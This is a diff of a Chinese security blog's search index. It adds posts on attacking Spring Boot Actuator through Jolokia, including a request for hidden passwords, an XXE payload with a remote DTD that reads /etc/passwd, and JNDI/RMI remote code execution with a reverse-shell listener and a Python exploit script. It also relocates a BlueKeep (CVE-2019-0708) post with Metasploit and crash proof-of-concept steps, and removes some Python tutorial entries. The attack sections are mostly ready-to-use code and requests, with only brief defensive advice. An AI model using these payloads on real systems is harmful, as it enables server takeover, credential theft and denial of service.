+<h4 id="调用-org-springframework-cloud-context-environmentMbean"><a href="#调用-org-springframework-cloud-context-environmentMbean" class="headerlink" title="调用 org.springframework.cloud.context.environmentMbean"></a>调用 org.springframework.cloud.context.environmentMbean</h4><p>通过<code>org.springframework.cloud.context.environmentMbean</code>获取/env中被隐藏的账号密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="reloadByURL方法"><a href="#reloadByURL方法" class="headerlink" title="reloadByURL方法"></a>reloadByURL方法</h4><p>可能存在logback 库提供的reloadByURL方法</p>
 <p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞</p>
+<p><strong>XXE漏洞实现</strong></p>
+<p>创建<code>logback.xml</code>和<code>fileread.dtd</code>文件</p>
+<p><code>logback.xml</code>中写入公网web服务器地址</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>fileread.dtd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;:%d;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把创建的<code>logback.xml</code>和<code>fileread.dtd</code>文件上传到公网web服务器下</p>
+<p>远程访问<code>logback.xml</code>文件，其中<code>www.xxx.com</code>是靶机的地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:&#x2F;&#x2F;x.x.x.x&#x2F;logback.xml</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以成功通过XXE读取到etc/passwd文件内容</p>
+<p><strong>RCE远程代码执行</strong></p>
+<p>下载RCE代码</p>
+<p><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
+<p>修改<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java</code>的代码</p>
+<p>可以修改RMI远程监听的端口，和反弹shell的地址和端口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt3c2guyqhj60xc0bs0zg02.jpg" alt="Spring Boot RCE.png"></p>
+<p>利用maven对Java代码进行编译打包</p>
+<p>进入<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer</code>目录，执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>
+
+<p>打包后创建target目录下生成<code>RMIServer-0.1.0.jar</code>文件</p>
+<p>修改<code>logback.xml</code>的内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把RMIServer-0.1.0.jar文件上传到公网web服务器上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过<code>Djava.rmi.server.hostname=x.x.x.x</code>指定自己的RMI监听的外网地址</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-<span class="number">0.1</span><span class="number">.0</span>.jar</span><br></pre></td></tr></table></figure>
+
+<p>使用NC监听反弹shell指定的窗口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>访问靶机url</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;jolokia&#x2F;exec&#x2F;ch.qos.logback.classic:Name&#x3D;default,Type&#x3D;ch.qos.logback.classic.jmx.JMXConfigurator&#x2F;reloadByURL&#x2F;http:&#x2F;&#x2F;x.x.x.x&#x2F;logback.xml</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="createJNDIRealm方法"><a href="#createJNDIRealm方法" class="headerlink" title="createJNDIRealm方法"></a>createJNDIRealm方法</h4><p>查看<code>/jolokia/list</code>中存在的是否存在<code>org.apache.catalina.mbeans.MBeanFactory</code>类提供的<code>createJNDIRealm</code>方法，可能存在JNDI注入，导致远程代码执行</p>
+<p>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入<br>可以使用burp一步步重放，也可以直接使用python脚本执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用jar包-RMIServer-0.1.0.jar，运行RMI服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname&#x3D;x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>
+
+<p>使用NC监听反弹shell指定的窗口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>使用python发送请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python EXP.py http:&#x2F;&#x2F;x.x.x.x&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.禁用<code>/actuator/</code>页面以及子路径，适用于spring 2.x</p>
 <p>2.禁用所有接口，将配置改成<code>endpoints.enabled = false</code></p>
 <p>3.在<code>pom.xml</code>引入<code>spring-boot-starter-security</code>依赖</p>
@@ -208,93 +538,6 @@
       <tags>
         <tag>未授权访问</tag>
         <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-urllib</title>
-    <url>//e28b0e650137.html</url>
-    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
-<p>语法：</p>
-<p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
-<ul>
-<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
-</li>
-<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,当给出<code>data</code>参数时,传参变成<code>POST</code></p>
-</li>
-<li><p><code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
-</li>
-<li><p><strong>timeout</strong>: 设置网站的访问超时时间，仅适用于HTTP，HTTPS和FTP连接</p>
-</li>
-<li><p><strong>context</strong>: 实现SSL加密传输，必须是<code>ssl.SSLContext</code>类型</p>
-</li>
-<li><p><strong>cafile</strong>: 指定CA证书</p>
-</li>
-<li><p><strong>capath</strong>: 指定CA证书的路径</p>
-</li>
-<li><p><strong>cadefault</strong>: 已经废弃，默认为<code>False</code></p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = urllib.request.urlopen(url,data=data,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="request-1"><a href="#request-1" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
-<p>语法：</p>
-<p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
-<ul>
-<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
-</li>
-<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,<code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
-</li>
-<li><p><strong>headers</strong>: 用来构造请求头，也可以通过请求实例的<code>add_header()</code>方法添加</p>
-</li>
-<li><p><strong>method</strong>: 指定请求使用的方法</p>
-</li>
-<li><p><strong>origin_req_host</strong>: 指定请求方的host名称或者是IP地址</p>
-</li>
-<li><p><strong>unverifiable</strong>: 设置网页是否需要验证，默认是<code>False</code></p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以使用 add_header 添加headers</span></span><br><span class="line"><span class="comment"># req = urllib.request.Request(url=url,data=data,method=&#x27;POST&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;User-Agent&#x27;,&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;Host&#x27;,&#x27;httpbin.org&#x27;)</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
-<h2 id="response"><a href="#response" class="headerlink" title="response"></a>response</h2><p>urlopen返回对象提供方法：</p>
-<p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
-<p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
-<p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
-<p>geturl()：返回请求的url</p>
-<h2 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h2><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析URL</p>
-<p>语法：</p>
-<p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
-<ul>
-<li><strong>urlstring</strong>: 表示字符串的url地址</li>
-<li><strong>scheme</strong>: 表示协议类型</li>
-<li><strong>allow_fragments</strong>: 默认为<code>True</code>，如果为<code>False</code>则无法识别片段标识符，返回<code>fragment=&#39;&#39;</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;http://python.org/学习/index?a=1&#x27;</span></span><br><span class="line">Result = urllib.parse.urlparse(key)</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;python.org&#x27;</span>, path=<span class="string">&#x27;/学习/index&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;a=1&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 其中scheme是协议，netloc是域名，path是路径，params是参数，query是查询的条件，fragment是片段</span></span><br><span class="line"><span class="comment"># 也可以单独输出</span></span><br><span class="line"><span class="built_in">print</span>(Result.scheme)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h3><p>对URL进行编码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line">http%3A//python.org/%E5%AD%A6%E4%B9%A0</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h3><p>对URL进行解码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line">key2 = urllib.parse.unquote(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"></span><br><span class="line">http://python.org/学习</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
       </tags>
   </entry>
   <entry>
@@ -723,23 +966,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-类与对象</title>
-    <url>//e7374bcdaaf3.html</url>
-    <content><![CDATA[<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象是内存中专门存储数据的一块区域</p>
-<p>对象由三部分：对象的标识（id），对象的类型（type），对象的值（value）</p>
-<p>1.标识用于唯一标识对象，通常对应于对象在计算机内存中的地址。使用内置函数<code>id(obj)</code>可返回对象obj的标识</p>
-<p>2.类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用<code>type(obj)</code>获得对象的所属类型。</p>
-<p>3.值表示对象所存储的数据的信息，使用<code>print(obj)</code>可以直接打印出值。</p>
-<p>对象就是：一个内存块，拥有特定的值，支持特点类型的相关操作</p>
-<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2>]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python3基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3运算符</title>
     <url>//dbb1ec05ea08.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -1082,6 +1308,23 @@
 </tr>
 </tbody></table>
 ]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python3基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-类与对象</title>
+    <url>//e7374bcdaaf3.html</url>
+    <content><![CDATA[<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象是内存中专门存储数据的一块区域</p>
+<p>对象由三部分：对象的标识（id），对象的类型（type），对象的值（value）</p>
+<p>1.标识用于唯一标识对象，通常对应于对象在计算机内存中的地址。使用内置函数<code>id(obj)</code>可返回对象obj的标识</p>
+<p>2.类型用于表示对象存储的“数据”的类型。类型可以限制对象的取值范围以及可执行的操作。可以使用<code>type(obj)</code>获得对象的所属类型。</p>
+<p>3.值表示对象所存储的数据的信息，使用<code>print(obj)</code>可以直接打印出值。</p>
+<p>对象就是：一个内存块，拥有特定的值，支持特点类型的相关操作</p>
+<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2>]]></content>
       <categories>
         <category>Python3</category>
       </categories>
@@ -1488,49 +1731,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
-    <url>//ddf32da2222d.html</url>
-    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows 7</li>
-<li>Windows server 2008 R2</li>
-<li>Windows server 2008</li>
-<li>Windows 2003</li>
-<li>Windows xp</li>
-</ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
-
-<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
-<p>2.安装安全管家类的软件</p>
-<p>3.关闭远程桌面，开启防火墙</p>
-<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Elasticsearch未授权访问</title>
     <url>//9db3aff65775.html</url>
     <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
@@ -1602,6 +1802,49 @@
       </categories>
       <tags>
         <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
+    <url>//ddf32da2222d.html</url>
+    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
+<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
